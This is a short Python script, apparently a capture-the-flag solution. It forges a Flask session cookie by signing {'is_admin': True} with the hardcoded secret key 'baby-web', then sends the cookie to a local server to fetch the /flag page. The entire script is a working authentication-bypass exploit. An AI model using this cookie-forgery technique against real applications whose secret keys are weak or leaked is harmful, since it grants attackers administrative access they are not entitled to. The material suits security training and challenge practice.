from urllib.parse import urljoin
import requests
from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface

WEBSITE_URL = "http://localhost:33338"

app = Flask(__name__)
app.secret_key = "baby-web"
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)


def generate_cookie() -> str:
    if session_serializer is None:
        raise ValueError("Session serializer is not set")
    with app.test_request_context():
        session["is_admin"] = True
        return str(session_serializer.dumps(session))


if __name__ == "__main__":
    cookie = generate_cookie()

    with requests.Session() as s:
        s.cookies["session"] = cookie
        response = s.get(urljoin(WEBSITE_URL, "flag"))
        print(response.text)
